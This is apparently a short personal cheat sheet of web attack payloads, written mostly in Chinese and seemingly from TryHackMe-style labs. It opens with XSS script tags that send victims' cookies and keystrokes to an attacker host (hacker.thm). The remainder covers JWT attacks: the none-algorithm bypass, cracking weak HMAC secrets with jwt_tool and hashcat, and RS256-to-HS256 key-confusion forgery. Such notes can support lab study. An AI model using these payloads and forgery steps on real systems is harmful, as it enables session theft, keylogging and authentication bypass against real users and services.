<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>

原型污染是一种javascript漏洞，攻击者可以将任意属性添加到全局变量原型，然后这些属性可能被用户定义的对象继承。

# jwt 
未经验证的签名--忘记验证签名了
越权漏洞等

签名有验证缺陷--NONE算法 alg->none
jwt_tools.py jwt-token -X a

破解弱共享密码
注意：必须是HMAC-SHA算法
jwt_tools.py jwt_token -C -d jwt_secrets.txt
echo jwt_token > jwt_file
hashcat -a 0 -m 16500 jwt_file  jwt_secrets --force

算法混淆攻击 RSA->HS256
构造jwt
jwt editor keys插件
1、获取公钥 public key
/jwks.json  /.well-known/jwks.json等
2、JWT Editor Keys 点击 NEW RSA KEY，复制jwks.json种key的值到jwk框，点击ok
copy public key as PEM 对其base64编码
3、点击new symmetric key 点generate 并替换K的值为pem编码后的值
4、回到请求体jwt，进行sign签名

算法RS256更改为HS256
获取 public.pem
openssl s_client -connect hostname:443
服务器证书输出复制到一个文件cert.pem
openssl x509 -in cert.pem -pubkey -noout > public.pem
jwt_tools.py jwt_token -S hs256 -k public.pem
jwt_tools.py jwt_token -S hs256 -k public.pem -T
标头参数住入

